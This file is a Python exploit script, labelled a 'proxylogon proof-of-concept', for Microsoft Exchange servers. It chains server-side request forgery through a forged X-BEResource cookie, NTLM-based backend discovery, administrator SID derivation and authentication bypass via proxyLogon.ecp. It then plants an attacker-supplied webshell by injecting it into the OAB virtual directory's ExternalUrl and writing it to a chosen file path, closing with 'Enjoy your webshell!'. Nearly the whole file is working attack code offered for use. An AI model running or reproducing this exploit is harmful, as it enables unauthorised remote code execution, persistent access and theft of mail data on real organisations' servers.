import requests
import urllib
import base64
import json
import sys
import re

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from impacket import ntlm

class Proxy(object):

    def __init__(self, frontend, backend, proxy=None):
        self.user_agent = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36'
        if proxy:
            self.proxies = {'https': proxy}
        else:
            self.proxies = {}
        self.session = requests.Session()
        self.frontend = frontend
        self.backend = backend

    def send(self, r):
        r.cookies = self.session.cookies
        r.cookies['X-BEResource'] = f'[:[@{self.backend}:444{r.url}#~1941962753'
        r.headers['User-Agent'] = self.user_agent
        r.url = f'{self.frontend}/ecp/favicon.ico'
        return self.session.send(r.prepare(), verify=False, proxies=self.proxies)

if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(description='proxylogon proof-of-concept')
    parser.add_argument('--frontend', type=str, help='external url to exchange (e.g. https://exchange.example.org)')
    parser.add_argument('--email',    type=str, help='valid email on the target machine')
    parser.add_argument('--sid',      type=str, help='exchange admin sid')
    parser.add_argument('--webshell', type=str, help='webshell to upload')
    parser.add_argument('--path',     type=str, help='desired path to webshell on host')
    parser.add_argument('--backend',  type=str, help='[optional] backend host (leaked in X-CalculatedBETarget)')
    parser.add_argument('--proxy',    type=str, help='[optional] proxy traffic (e.g. http://127.0.0.1:8080)')
    args = parser.parse_args()

    webshell = open(args.webshell).read()
    if '%' in webshell:
        raise Exception('payload may not contain %')
    if len(webshell) > 246:
        raise Exception('payload must be less than 246 bytes')
    if '\n' in webshell:
        print('Removing newlines from webshell')
        webshell = webshell.replace('\n', '')

    if not args.email and not args.sid:
        print('Must provide either an email or SID')
        sys.exit(1)

    if not args.backend:
        print('Retrieving backend via RPC')
        ntlmHash = str(base64.b64encode(ntlm.getNTLMSSPType1().getData()))[2:-1]
        r = requests.Request('RPC_IN_DATA', f'{args.frontend}/rpc/rpcproxy.dll')
        r.headers['Authorization'] = f'NTLM {ntlmHash}'
        sess = requests.Session()
        if args.proxy:
            proxies = {'https': args.proxy}
        else:
            proxies = {}
        r = sess.send(r.prepare(), verify=False, proxies=proxies)
        if r.status_code != 401:
            raise Exception(f'RPC NTLM Session Auth received {r.status_code}')
        serverChallengeBase64 =  re.search('NTLM ([a-zA-Z0-9+/]+={0,2})', r.headers['WWW-Authenticate']).group(1)
        serverChallenge = base64.b64decode(serverChallengeBase64)
        challenge = ntlm.NTLMAuthChallenge(serverChallenge)
        hashData = ntlm.AV_PAIRS(challenge['TargetInfoFields'])
        args.backend = str(hashData.fields[3][1], 'utf-16')
        print(f'Backend: {args.backend}')

    p = Proxy(args.frontend, args.backend, proxy=args.proxy)

    if args.email is not None:
        url = '/autodiscover/autodiscover.xml'
        r = requests.Request('POST', url)
        r.headers['Content-Type'] = 'text/xml'
        r.data = f'<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>{args.email}</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover> '
        r = p.send(r)
        if r.status_code != 200:
            raise Exception(f'Unexpected autodiscover status {r.status_code}')

        legacyDn = re.search('<LegacyDN>(.*)</LegacyDN>', r.text).groups()[0]
        mailboxId = re.search('<Server>(.*)</Server>', r.text).groups()[0]

        url = f'/mapi/emsmdb/?mailboxId={mailboxId}'
        r = requests.Request('POST', url)
        r.headers['X-RequestType'] = 'Connect'
        r.headers['X-RequestId'] = '12345678-1234-1234-1234-1234567890ab'
        r.headers['X-ClientApplication'] = 'MapiHttpClient/15.2.464.5'
        r.headers['Content-Type'] = 'application/mapi-http'
        r.headers['Accept'] = '*/*'
        # esmdb message taken from packet captures and then modified to remove extra data by setting extra length to 0
        mapiReqTemplate = '%s\x00\x00\x00\x00\x00\x9fN\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        r.data = mapiReqTemplate % legacyDn
        r = p.send(r)
        if r.status_code != 200:
            raise Exception(f'Unexpected mapi status {r.status_code}')
        sidMatch = re.search('with SID (S-1-5-[\d-]+)', r.text).groups()[0]
        print(f'Identified SID: {sidMatch}')
        adminSid = '-'.join(sidMatch.split('-')[:-1]) + '-500'
        print(f'Admin SID: {adminSid}')
        args.sid = adminSid

    print('Authenticating via proxylogon')
    url = '/ecp/proxyLogon.ecp'
    r = requests.Request('POST', url)
    r.headers['msExchLogonMailbox'] = args.sid
    r.data = f'<r at="" ln=""><s>{args.sid}</s></r>'
    r = p.send(r)
    if r.status_code != 241:
        raise Exception(f'Unexpected proxylogon status {r.status_code}')
    csrf = r.cookies['msExchEcpCanary']

    print('Looking up OAB virtual directory')
    params = {
        'workflow': 'GetForSDO',
        'schema': 'OABVirtualDirectory',
        'msExchEcpCanary': csrf,
    }
    url = f'/ecp/DDI/DDIService.svc/GetObject?{urllib.parse.urlencode(params)}'
    r = requests.Request('POST', url)
    r.headers = {
        'Content-Type': 'application/json',
        'msExchLogonMailbox': args.sid,
    }
    r.data = '{}'
    r = p.send(r)
    if r.status_code != 200:
        raise Exception(f'Unexpected GetObject status {r.status_code}')

    directories = r.json().get('d', {}).get('Output', [])
    if not directories:
        raise Exception('Failed to find OAB directory')
    oab = directories[0]
    name = oab.get('Identity', {}).get('DisplayName', 'Unknown')
    print(f'OAB virtual directory: {name}')

    print('Injecting payload into OAB ExternalUrl')
    params = {
        'schema': 'OABVirtualDirectory',
        'msExchEcpCanary': csrf,
    }
    url = f'/ecp/DDI/DDIService.svc/SetObject?{urllib.parse.urlencode(params)}'
    r = requests.Request('POST', url)
    r.headers = {
        'Content-Type': 'application/json',
        'msExchLogonMailbox': args.sid,
    }
    r.data = json.dumps({
        'identity': oab.get('Identity'),
        'properties': {
            'Parameters': {
                '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',
                'ExternalUrl': f'http://o/#{webshell}',
            }
        }
    })
    r = p.send(r)
    if r.status_code != 200:
        raise Exception(f'Unexpected SetObject status {r.status_code}')

    print('Resetting OAB virtual directory')
    params = {
        'schema': 'ResetOABVirtualDirectory',
        'msExchEcpCanary': csrf,
    }
    url = f'/ecp/DDI/DDIService.svc/SetObject?{urllib.parse.urlencode(params)}'
    r = requests.Request('POST', url)
    r.headers = {
        'Content-Type': 'application/json',
        'msExchLogonMailbox': args.sid,
    }
    r.data = json.dumps({
        'identity': oab.get('Identity'),
        'properties': {
            'Parameters': {
                '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',
                'FilePathName': args.path,
            }
        }
    })
    r = p.send(r)
    if r.status_code != 200:
        raise Exception(f'Unexpected SetObject status {r.status_code}')

    print(f'Enjoy your webshell!')
